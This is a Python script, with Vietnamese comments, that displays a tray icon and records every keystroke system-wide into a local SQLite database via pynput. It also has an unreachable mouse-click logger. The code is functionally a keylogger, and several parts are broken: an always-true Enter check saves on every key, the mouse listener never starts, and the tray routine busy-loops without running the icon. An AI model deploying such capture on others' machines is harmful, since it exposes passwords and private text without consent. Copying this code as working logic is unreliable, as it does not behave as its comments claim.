import sqlite3
import pystray
from PIL import Image
from pynput import mouse, keyboard
import threading

icon_visible = True
keys = ""

def save(key):
    global keys
    try:
        if key is not None:
            conn = sqlite3.connect("data/database.db")
            cursor = conn.cursor()  
            cursor.execute("INSERT INTO history(history) VALUES(?);", (key,))
            conn.commit()
            conn.close()
            keys = ""
    except Exception as e:
        print(e)


def on_mouse_click(x, y, button, pressed):
    if pressed:
        global keys
        save(keys)

# Hàm callback khi click chuột phải vào biểu tượng tray
def on_click(icon, item):
    global icon_visible
    print(f'Đã click vào {item}')
    # Thay đổi trạng thái hiển thị của biểu tượng
    icon_visible = not icon_visible
    if icon_visible:
        icon.visible = True
    else:
        icon.visible = False

# Hàm để hiển thị biểu tượng tray
def create_tray_icon():
    image = Image.open("bin/img/icon.png")  # Thay đổi đường dẫn đến icon của bạn
    menu = (
        ("Item 1", None, on_click),
        ("Item 2", None, on_click)
    )

    # Tạo biểu tượng tray
    icon = pystray.Icon("my_app_name", image, "My App", menu)
    icon.visible = True  # Hiển thị biểu tượng tray khi chương trình bắt đầu

    # Duy trì hiển thị biểu tượng tray ngay cả khi không có vòng lặp chạy
    while icon_visible:
        icon.visible = True

# Hàm callback khi phím được nhấn
def on_press(key):
    global keys
    if keyboard.Key.enter:
        save(keys)
    keys += str(key)
        #if key == keyboard.Key.esc:  # Nếu phím Escape được nhấn, dừng lắng nghe
         #   pass
            #return False
    #try:    
        # Lưu các tương tác từ bàn phím vào tệp tin hoặc thực hiện các xử lý khác ở đây
    #except AttributeError:
        #print(f'Phím chưa được xác định: {key}')

# Hàm callback khi phím được thả ra
def on_release(key):
    #try:
     #   save(key.char)
        #if key == keyboard.Key.esc:  # Nếu phím Escape được nhấn, dừng lắng nghe
         #   pass
            #return False
    #except Exception as e:
    pass
        #print(f'Phím chưa được xác định: {key}')

if __name__ == "__main__":
    # Tạo một luồng riêng biệt để hiển thị biểu tượng tray
    tray_thread = threading.Thread(target=create_tray_icon)
    tray_thread.start()

    # Lắng nghe sự kiện từ bàn phím
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    with mouse.Listener(on_click=on_mouse_click) as listener1:
        listener1.join()



